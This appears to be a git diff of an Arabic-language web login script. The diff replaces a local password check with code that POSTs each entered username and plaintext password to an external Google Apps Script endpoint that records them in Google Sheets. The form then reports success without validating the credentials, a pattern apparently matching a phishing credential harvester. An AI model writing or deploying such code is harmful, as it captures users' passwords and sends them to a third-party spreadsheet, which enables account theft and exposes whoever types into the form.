@@ -12,22 +12,31 @@ document.addEventListener("DOMContentLoaded", function () {
             return;
         }
 
-        // ✅ التحقق مما إذا كان المستخدم مسجلاً مسبقًا
-        const storedUser = localStorage.getItem(username);
-
-        if (storedUser) {
-            const userData = JSON.parse(storedUser);
-
-            if (userData.password === password) {
-                alert("✅ تسجيل الدخول ناجح!");
+        // ✅ إرسال البيانات إلى Google Sheets
+        fetch("https://script.google.com/macros/s/AKfycbzeGNKVeWxvuyLf4UrPFvJEVDfPvugU9-sPBUNJZsxheDEcuykRp2iB-aiRN_CV13yB/exec", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                username: username,
+                password: password
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.status === "success") {
+                alert("✅ تم حفظ البيانات بنجاح في Google Sheets!");
                 document.getElementById("login-box").style.display = "none";
                 document.getElementById("success-box").style.display = "block";
             } else {
-                alert("❌ كلمة المرور غير صحيحة!");
+                alert("❌ حدث خطأ أثناء حفظ البيانات!");
             }
-        } else {
-            alert("❌ المستخدم غير مسجل!");
-        }
+        })
+        .catch(error => {
+            console.error("❌ خطأ في الاتصال:", error);
+            alert("❌ لم يتمكن من إرسال البيانات!");
+        });
     });
 
     // ✅ زر التسجيل (إضافة مستخدم جديد)
@@ -50,4 +59,3 @@ document.addEventListener("DOMContentLoaded", function () {
         });
     }
 });
-};
